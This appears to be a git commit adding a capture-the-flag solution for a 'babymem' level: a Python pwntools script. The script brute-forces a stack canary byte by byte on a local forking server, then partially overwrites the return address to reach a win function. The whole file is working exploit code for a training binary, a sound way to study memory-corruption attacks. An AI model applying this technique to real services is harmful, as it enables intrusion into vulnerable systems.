d316ebb09dc1025fdd71453fba39843807734e04
Jiun Jeong <programmer-j@naver.com>
2022-03-20 16:36:25 +0900

    Add a solution for babymem level15 testing1.

---
+++ babymem/level15/testing1/README.md
@@ -0,0 +1,1 @@
+Apply the same stategy.
---
+++ babymem/level15/testing1/run.py
@@ -0,0 +1,77 @@
+#!/usr/bin/env python3
+
+from pwn import *
+
+FILENAME='/babymem_level15_testing1'
+context.log_level = 'WARNING'
+
+# Run a server program
+server = process(FILENAME)
+
+stack_canary = [0x0]
+byte_val = 0x0
+
+while len(stack_canary) < 8:
+    # Create a process
+    p = remote('localhost', 1337)
+
+    # Send input
+    p.sendline(bytes(str(40 + len(stack_canary) + 1), 'utf-8'))
+    
+    payload = b'a' * 40
+    for element in stack_canary:
+        payload += p8(element)
+    payload += p8(byte_val)
+
+    p.recvline_startswith(b"Payload size: Send your payload (up to ")
+    log.warning('trying stack canary: ' + str(stack_canary + [byte_val]))
+    p.send(payload)
+
+    # Check whether stack smashing has happened and run again with different value in that case
+    if server.recvline_startswith(b'*** stack smashing detected ***', timeout=1):
+        byte_val = 0 if byte_val == 255 else byte_val + 1
+    else:
+        # Stack canary found: try to find the next byte value
+        stack_canary.append(byte_val)
+        log.warning('%d bytes stack canary found: ' % len(stack_canary) + str(stack_canary))
+        byte_val = 0x0
+    
+    p.close()
+
+byte_val = 0x9
+return_address = [0xa6]
+
+while len(return_address) < 2:
+    # Create a process
+    p = remote('localhost', 1337)
+
+    # Send input
+    p.sendline(bytes(str(56 + len(return_address) + 1), 'utf-8'))
+    
+    payload = b'a' * 40
+
+    for element in stack_canary:
+        payload += p8(element)
+
+    payload += b'a' * 8
+
+    for element in return_address:
+        payload += p8(element)
+    payload += p8(byte_val)
+    
+    p.recvline_startswith(b"Payload size: Send your payload (up to ")
+    log.warning('trying return address: ' + str(return_address + [byte_val]))
+    p.send(payload)
+
+    # Receive data
+    if server.recvline_startswith(b'You win!', timeout=1):
+        # Return address found: try to find the next byte value
+        return_address.append(byte_val)
+        log.warning('%d bytes return address found: ' % len(return_address) + str(return_address))
+    else:
+        # Run again with different value if the return address is invalid
+        byte_val = 0x9 if byte_val > 255 else byte_val + 16
+    
+    p.close()
+
+server.interactive()
